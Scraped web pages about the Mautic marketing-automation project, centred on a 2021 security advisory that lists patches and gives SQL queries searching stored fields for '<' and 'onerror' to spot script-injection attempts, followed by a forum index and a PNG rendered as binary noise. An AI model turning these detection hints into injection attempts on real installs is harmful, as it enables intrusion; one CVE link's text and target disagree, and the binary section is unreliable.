| [Announcing Mautic Conference Global 2024: The Premier Event for all things Mautic and Marketing Automation!](https://forum.mautic.org/t/announcing-mautic-conference-global-2024-the-premier-event-for-all-things-mautic-and-marketing-automation/31872) |  | 0 | 327 | April 26, 2024 |
| [2023: Year in review](https://forum.mautic.org/t/2023-year-in-review/31530) |  | 0 | 342 | April 2, 2024 |
| [Unlock Your Marketing Potential: Start Your Mautic Trial Today!](https://forum.mautic.org/t/unlock-your-marketing-potential-start-your-mautic-trial-today/31475) |  | 0 | 303 | March 28, 2024 |
| [Mautic 5: Beyond Expectations, Beyond Limits](https://forum.mautic.org/t/mautic-5-beyond-expectations-beyond-limits/30459) |  | 0 | 1254 | January 11, 2024 |
| [Announcing Mautic 5 Release Candidate-2 and revised date for General Availability](https://forum.mautic.org/t/announcing-mautic-5-release-candidate-2-and-revised-date-for-general-availability/30267) |  | 0 | 706 | December 19, 2023 |
| [Mautic announces its first community-elected Council](https://forum.mautic.org/t/mautic-announces-its-first-community-elected-council/30220) |  | 1 | 790 | December 14, 2023 |
| [🚨 Final chance to vote for the new Mautic Council!](https://forum.mautic.org/t/final-chance-to-vote-for-the-new-mautic-council/30186)  [community](https://forum.mautic.org/tag/community) ,  [governance](https://forum.mautic.org/tag/governance) ,  [council](https://forum.mautic.org/tag/council) ,  [elections](https://forum.mautic.org/tag/elections) |  | 1 | 324 | December 12, 2023 |
| [Introducing Dropsolid as the Inaugural Provider for the Official Mautic Trials](https://forum.mautic.org/t/introducing-dropsolid-as-the-inaugural-provider-for-the-official-mautic-trials/30073) |  | 0 | 533 | November 29, 2023 |
| [Announcing the Mautic 5 Release Candidate](https://forum.mautic.org/t/announcing-the-mautic-5-release-candidate/29967) |  | 0 | 593 | November 16, 2023 |
| [Shape the Future of Mautic: Call for Council Nominations](https://forum.mautic.org/t/shape-the-future-of-mautic-call-for-council-nominations/29901) |  | 1 | 992 | November 10, 2023 |
| [Introducing Mautic's New Community Portal: Your Hub for Collaboration and Engagement](https://forum.mautic.org/t/introducing-mautics-new-community-portal-your-hub-for-collaboration-and-engagement/29787) |  | 0 | 472 | October 30, 2023 |
| [Introducing Mautic's New Governance Model - Your Chance to Shape Our Future Together](https://forum.mautic.org/t/introducing-mautics-new-governance-model-your-chance-to-shape-our-future-together/28958)  [community](https://forum.mautic.org/tag/community) ,  [governance](https://forum.mautic.org/tag/governance) |  | 1 | 1262 | August 15, 2023 |
| [Request for Proposal (RFP) for Official Mautic Trial Provider](https://forum.mautic.org/t/request-for-proposal-rfp-for-official-mautic-trial-provider/28363) |  | 1 | 1881 | June 19, 2023 |
| [📣 Towards a future of independence](https://forum.mautic.org/t/towards-a-future-of-independence/27742)  [community](https://forum.mautic.org/tag/community) |  | 1 | 552 | April 18, 2023 |
| [Mautic Conference Global 2023 Call for Speakers open](https://forum.mautic.org/t/mautic-conference-global-2023-call-for-speakers-open/27338) |  | 0 | 373 | March 14, 2023 |
| [Announcing Mautic Conference Global 2023 (Online, June 21-22)](https://forum.mautic.org/t/announcing-mautic-conference-global-2023-online-june-21-22/27216) |  | 0 | 1028 | March 1, 2023 |
| [Update on Mautic 5](https://forum.mautic.org/t/update-on-mautic-5/27064) |  | 0 | 2450 | February 16, 2023 |
| [An update on the Mautic 5 release schedule](https://forum.mautic.org/t/an-update-on-the-mautic-5-release-schedule/25863) |  | 0 | 2521 | October 27, 2022 |
| [Share your Mautic review on G2](https://forum.mautic.org/t/share-your-mautic-review-on-g2/25163) |  | 0 | 534 | August 24, 2022 |
| [Mautic 4.3: Beyond Contacts and Companies](https://forum.mautic.org/t/mautic-4-3-beyond-contacts-and-companies/24200) |  | 0 | 1960 | May 24, 2022 |

**[next page →](/c/announcements/16?page=1)**

* [Home](/)
* [Categories](/categories)
* [Guidelines](/guidelines)
* [Terms of Service](https://www.mautic.org/code-of-conduct/)
* [Privacy Policy](https://www.mautic.org/privacy-policy/)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



=== Content from www.mautic.org_5fe46b86_20250119_111804.html ===

[Skip to main content](#main-content)

# [Home](/)

## User account menu

* [Register/Log In](/user/login)

## Main navigation

* About Mautic
  + [What is Mautic?](/what-is-mautic)
  + [Newsletter](/community/get-involved/mailing-lists)
  + [Take a tour](/tour)
  + [Marketing Automation](/marketing-automation-software)
  + [Mautic Case Studies](/case-studies)
  + Governance
    - [Mautic Trademark](/about/trademark)
    - [Governance history](/about/governance)
    - [Mautic Leadership Team](/mautic-leadership-team)
    - [Mautic Council](/mautic-council)
    - [The future of Mautic](/future-of-mautic)
    - [💰 Open Collective](https://opencollective.com/mautic "Check Mautic's financial activity")
  + Current Initiatives
    - [Strategic Initiatives](/strategic-initiatives)
    - [Community Initiatives](/community-initiatives)
    - [Next Generation](/next-generation)
    - [Tiger Teams](/tiger-teams)
    - [Working Groups](/working-groups)
* [Blog](/blog "Mautic Community Blog")
* Download
  + [Download Mautic](/download "Download Mautic")
  + [Requirements](/download/requirements)
  + Releases
    - [Mautic Releases](/mautic-releases)
    - [Source Code](/download/source-code)
    - [Demo](/demo)
  + Security
    - [Mautic Security Team](/mautic-security-team)
    - [Mautic Security Advisory Policy](/mautic-security-team/mautic-security-advisory-policy)
    - [How to report a security issue](/mautic-security-team/how-to-report-a-security-issue)
    - [Resolving Security Issues](/mautic-security-team/triaging-and-resolving-security-issues)
    - [How to join the Mautic Security Team](/mautic-security-team/join-the-team)
    - [Meet the Mautic Security Team](/meet-the-mautic-security-team)
* Get Support
  + [Getting Support](/support)
  + [Community Forums](https://forum.mautic.org/)
  + Documentation
    - [User Documentation](https://docs.mautic.org "Mautic end-user documentation")
    - [Developer Documentation](https://devdocs.mautic.org "Mautic Developer Documentation")
    - [Knowledgebase](https://kb.mautic.org)
  + [Basic setup guide](https://docs.mautic.org/en/5.x/getting_started/how_to_install_mautic.html)
  + [Building a theme](https://devdocs.mautic.org/en/5.x/themes/getting_started.html)
  + [Contact Information](/about/contact-information)
* Support Mautic
  + Financial support
    - [Become a member](/become-a-member-of-mautic)
    - [Members](/mautic-members)
    - [Partners](/mautic-partners)
    - [Sponsors](/sponsors)
  + Contribute
    - [Code of conduct](/code-of-conduct)
    - [Community Handbook](https://contribute.mautic.org "Handbook for the Mautic Community")
    - [Join the community](/community)
    - [Ways to contribute](https://mau.tc/contribute)
    - [Get started](/community/get-involved)
    - [Translation Guidance](/translation-guidance)
    - [Community Events](https://community.mautic.org/meetings/)
  + [Community Portal](https://community.mautic.org)
  + [👕 Swag shop](https://mautic-community-swag-shop.myspreadshop.com/)
* Try Mautic
  + [Request a trial](https://m.mautic.org/mautic-start-your-trial)

## User account menu

* [Register/Log In](/user/login)

## Search

Search

[Community Marketing Blog](/category/blog/community)  [0](#node-blog-comment--2)

# Security release for all versions of Mautic prior to 2.16.5 and 3.2.4

By [Ruth Cheesley](/author/ruth-cheesley "View user profile.")
· PUBLISHED January 14, 2021 · UPDATED January 28, 2021

Image
 ![Security Release](/sites/default/files/styles/blog_detail_featured_image_720x330/public/2021-01/mautic-blog-image-security-release.png?itok=uc224A1m)

We have made available for immediate download an out-of-sequence release for both Mautic 2.x and 3.x.

We have also published some resources on the website:

* [Landing page for the security team](https://www.mautic.org/mautic-security-team)
* [Security Advisory Policy](https://www.mautic.org/mautic-security-team/mautic-security-advisory-policy)
* [How to report a security issue](https://www.mautic.org/mautic-security-team/how-to-report-a-security-issue)
* [How we triage, resolve and release fixes for security issues](https://www.mautic.org/mautic-security-team/triaging-and-resolving-security-issues)
* [How to join the Mautic Security Team](https://www.mautic.org/mautic-security-team/join-the-team)
* [Meet the Mautic Security Team](https://www.mautic.org/meet-the-mautic-security-team)

This release addresses:

1. A **Moderately Critical** Vulnerability (Vulnerability 1) reported by Dardan Prebreza at Bishop Fox, and
2. A **Highly Critical** Vulnerability (Vulnerability 2) reported by Naveen Sunkavally at Horizon3.ai.

### Risk Ratings

These are based on the information in the ‘[how we triage, resolve and release fixes for security issues](https://www.mautic.org/mautic-security-team/triaging-and-resolving-security-issues)’ page above.

#### Vulnerability 1

12/25 (**Moderately Critical**) AC:Complex/A:Admin/CI:Some/II:Some/E:Theoretical/TD:All

#### Vulnerability 2

22/25 (**Highly Critical**) AC:None/A:None/CI:All/II:All/E:Theoretical/TD:All

As Vulnerability 2 affects **every released version** of Mautic and allows an attacker to create a user in Mautic with elevated privileges, all users are **strongly urged** to update immediately.

More information can be found in the CVE reports here - details will be added following the release:

### Vulnerability 1

[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35128](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3142)

### Vulnerability 2

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35124>

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35125>

### Patches

The easiest way to protect your Mautic instances is to simply update to 2.16.5 or 3.2.4 in the usual way. If you are unable to do this for any reason, the patch files are provided below.
#### Fix for both vulnerabilities

Link to patch for 2.x versions: <https://github.com/mautic/mautic/compare/2.16.4...2.16.5.diff>

Link to patch for 3.x versions: <https://github.com/mautic/mautic/compare/3.2.2...3.2.4.diff>

## ⚠️ Important note for users who are currently running 3.2.0 or later

Are you currently using Mautic 3.2.0 or later **and do you update through the CLI (Command Line Interface)**? Then the message below applies to you! This **does not apply** if you're updating through the UI (graphical interface).

When you're trying to update through the CLI, you might run into the following error:

```

Notice: Undefined index: message in /var/www/html/app/bundles/CoreBundle/Update/Step/InstallNewFilesStep.php on line 131

Failed to execute command php bin/console mautic:update:apply: exit status 1
```

This bug was introduced in Mautic 3.2.0 and fixed in 3.2.4. Please use the following workaround:

```

wget https://github.com/mautic/mautic/releases/download/3.2.4/3.2.4-update.zip
php bin/console mautic:update:apply --update-package=3.2.4-update.zip
php bin/console mautic:update:apply --finish
```
## How to scan for attempts to exploit the vulnerability

We have also provided some searches that you can do to see if there have been attempts to exploit the highly critical vulnerability.

### Check for exploit attempts - Vulnerability 1

To see if there was an attempt at this vulnerability, run the following queries replacing PREFIX\_ with your own if configured:

* >select \* from PREFIX\_companies where companyname like '%<%' or companyname like '%onerror%';

### Check for exploit attempts - Vulnerability 2

The first and absolutely necessary step is to check if there are any unrecognized users listed in Mautic’s User manager. Delete or unpublish any not recognized immediately.

To see if there was an attempt at this vulnerability, run the following queries replacing PREFIX\_ with your own if configured:

* >select \* from PREFIX\_form\_submissions where referer like '%<%' or referer like '%onerror%';
* >select \* from PREFIX\_asset\_downloads where referer like '%<%' or referer like '%onerror%';
* >select \* from PREFIX\_companies where companyname like '%<%' or companyname like '%onerror%';

If there are any results returned, review them to look for HTML tags. If it looks like HTML is embedded, delete the entry from the database.

## Credits

Thanks to Dardan Prebreza at Bishop Fox and Naveen Sunkavally at Horizon3.ai for responsibly reporting these vulnerabilities.

Thanks to Alan Hartless at Acquia and Dennis Ameling for fixing these vulnerabilities.

**Addendum**

After the release was made, a bug was identified which affects command-line updates in Mautic 3.2.0 and later. This bug was introduced back in Mautic 3.2.0 but was causing problems for people updating at the command line.  As a result, we issued 3.2.4 to address this issue.

Tags
[security-announcement](/tag/security-announcement)
[release](/tag/release)
[new release](/tag/new-release)

## You May Also Like...

 [![a black background with a sparkler painting the numbers 2024 in the sky](/sites/default/files/styles/small_highlight_239_x_113_/public/2025-01/happy-new-year-2024-sparkling-burning-text-happy-new-year-2024-isolated-black-background.jpg?itok=trNoF_gU)](/blog/community/2024-year-review)
[0](/blog/community/2024-year-review#node-blog-comment--2)[2024: year in review](/blog/community/2024-year-review)January 17, 2025
 [![Photo of a mug containing hot chocolate with marshmallows, and some of the marshmallows have been made into the shape of a snowman with a face drawn on and hands and ears added. There are oranges and cinnamon on the table beside and behind is a blurred image of festive lights.](/sites/default/files/styles/small_highlight_239_x_113_/public/2025-01/26163.jpg?itok=1N7_H-p4)](/blog/community/open-startup-report-22-december-2024)
[0](/blog/community/open-startup-report-22-december-2024#node-blog-comment--2)[Open Startup Report #22 - December 2024](/blog/community/open-startup-report-22-december-2024)January 16, 2025
 [![A photo of a brown tree which is growing sideways, with a wooden post carved to look like a hand which is supporting one of the large boughs.](/sites/default/files/styles/small_highlight_239_x_113_/public/2024-08/neil-thomas-SIU1Glk6v5k-unsplash.jpg?itok=NpTaR14C)](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)
[0](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program#node-blog-comment--2)[Announcing the launch of Mautic's Extended Long Term Support (ELTS) program](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)December 19, 2024

### COMMENT ON THIS ARTICLE BY CLICKING HERE: [FORUM.MAUTIC.ORG](https://forum.mautic.org/t/security-release-for-all-versions-of-mautic-prior-to-2-16-5-and-3-2-3/17786)

## Follow

* [Facebook](http://facebook.com/MauticCommunity "Facebook")
* [Linkedin](https://linkedin.com/company/mautic-community "Linkedin")
* [Twitter](https://twitter.com/MauticCommunity "Twitter")
* [Youtube](https://www.youtube.com/channel/UCcc9_x7_gNICPkrbG2NU9Xw "Youtube")

* Previous Story[Mautic Conference 2020: What a Great Event!](/blog/community/mautic-conference-2020-what-great-event)
* Next Story[Q4 2020 Mautic Community Roundup](/blog/community/q4-2020-mautic-community-roundup)

* [Recent Blog](/quicktabs/nojs/blog_right_sidebar/0)
* [Recent Comment](/quicktabs/nojs/blog_right_sidebar/1)
* [Tag Cloud](/quicktabs/nojs/blog_right_sidebar/2)

 [![a black background with a sparkler painting the numbers 2024 in the sky](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2025-01/happy-new-year-2024-sparkling-burning-text-happy-new-year-2024-isolated-black-background.jpg?itok=rOEyCsAw)](/blog/community/2024-year-review)
[Community Marketing Blog](/category/blog/community)
[2024: year in review](/blog/community/2024-year-review)
17 Jan, 2025
 [![Photo of a mug containing hot chocolate with marshmallows, and some of the marshmallows have been made into the shape of a snowman with a face drawn on and hands and ears added. There are oranges and cinnamon on the table beside and behind is a blurred image of festive lights.](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2025-01/26163.jpg?itok=3HgQQmbx)](/blog/community/open-startup-report-22-december-2024)
[Community Marketing Blog](/category/blog/community)
[Open Startup Report #22 - December 2024](/blog/community/open-startup-report-22-december-2024)
16 Jan, 2025
 [![A photo of a brown tree which is growing sideways, with a wooden post carved to look like a hand which is supporting one of the large boughs.](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2024-08/neil-thomas-SIU1Glk6v5k-unsplash.jpg?itok=MKrUx9S0)](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)
[Community Marketing Blog](/category/blog/community)
[Announcing the launch of Mautic's Extended Long Term Support (ELTS) program](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)
19 Dec, 2024
 [![Title Image for RFP: mautic-certification-provider](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2024-12/rfp-mautic-certification-provider_2.png?itok=VJgPhDv7)](/blog/rfp-certification-provider)
[Community Marketing Blog](/category/blog/community)
[Request for Proposals (RFP) for Official Mautic Certification Provider](/blog/rfp-certification-provider)
19 Dec, 2024
 [![Dark blue gradient background with the Mautic logo and text in white saying 'Call for council nominations' with illustrations of lots of different hands being held up with different gestures wearing different coloured clothes.](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2023-11/Call%20for%20council%20nominations%20%28Blog%20Banner%29%20720x330.png?itok=ijbKvefV)](/blog/community/last-call-council-nominations)
[Community Marketing Blog](/category/blog/community)
[Last call for Council nominations](/blog/community/last-call-council-nominations)
19 Dec, 2024

No comments found at the moment.

[automation](/tag/automation)[b2b marketing](/tag/b2b-marketing)[b2c marketing](/tag/b2c-marketing)[community](/tag/community)[content marketing](/tag/content-marketing)[contributing](/tag/contributing)[customer relationship management](/tag/customer-relationship-management)[developer](/tag/developer)[email marketing](/tag/email-marketing)[event](/tag/event)[governance](/tag/governance)[lead nurturing](/tag/lead-nurturing)[marketing](/tag/marketing)[marketing automation](/tag/marketing-automation)[marketing blog](/tag/marketing-blog)[marketing strategy](/tag/marketing-strategy)[mautic](/tag/mautic)[mautic new release](/tag/mautic-new-release)[MautiCon](/tag/mauticon)[new release](/tag/new-release)[open source](/tag/open-source)[open source marketing](/tag/open-source-marketing)[Open Startup](/tag/open-startup)[Quarterly Report](/tag/quarterly-report)[release](/tag/release)[Report](/tag/report)[reporting](/tag/reporting)[Round Up](/tag/round)[sales funnel](/tag/sales-funnel)[tips](/tag/tips)

## BLOG CATEGORIES

* [Marketer Blog](/category/blog/marketer)
* [Developer Blog](/category/blog/developer)
* [Community Blog](/category/blog/community)
* [Integrator Blog](/category/blog/integrator)
* [Press](/category/blog/press)

[![JWT Auth for open source projects](//cdn.auth0.com/oss/badges/a0-badge-light.png)](https://auth0.com/?utm_source=oss&utm_medium=gp&utm_campaign=oss)

## Help

* [Getting Started](/getting-started)
* [About](/what-is-mautic)
* [Support](https://forum.mautic.org/c/support)

## Recent Articles

[2024: year in review](/blog/community/2024-year-review)
[Open Startup Report #22 - December 2024](/blog/community/open-startup-report-22-december-2024)
[Announcing the launch of Mautic's Extended Long Term Support (ELTS) program](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)
[Request for Proposals (RFP) for Official Mautic Certification Provider](/blog/rfp-certification-provider)
[Last call for Council nominations](/blog/community/last-call-council-nominations)

## Links

* [DB Hurley, Mautic Founder](http://dbhurley.com/)
* [Get involved](/community/get-involved "Get involved with the Mautic Community")
* [Mautic Community Forums](https://forum.mautic.org "Mautic Community Forums")
* [Official Mautic Newsletter](https://www.mautic.org/community/get-involved/mailing-lists)

[![Creative Commons Licence](https://i.creativecommons.org/l/by-sa/4.0/88x31.png)](http://creativecommons.org/licenses/by-sa/4.0/)This work is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0/).

MAUTIC is a trademark of the Mautic project of the Open Source Collective.

## Follow

* [Facebook](http://facebook.com/MauticCommunity "Facebook")
* [Linkedin](https://linkedin.com/company/mautic-community "Linkedin")
* [Twitter](https://twitter.com/MauticCommunity "Twitter")
* [Youtube](https://www.youtube.com/channel/UCcc9_x7_gNICPkrbG2NU9Xw "Youtube")



=== Content from avatars.githubusercontent.com_31e18b84_20250119_131222.html ===
�PNG

   
IHDR  �  �   �.�b  �IDATx��ױ��@Q�`\*��dĲ�m �\�A��i�k`?�x�\_������z �b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$l��b�}���z��X=�����e$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$l��Y��\=��1�X��O�۟�� |?c���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A쀄�c���s� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�6���>��ŏ��c��W���
s�:�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�6���yL{k��>WO������p� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� b$�� v@�� �1��
 o��H; A���H; A���H; A���H; A���H; A���H; A���H; A���H; A���  ��Ў#���h�    IEND�B`�
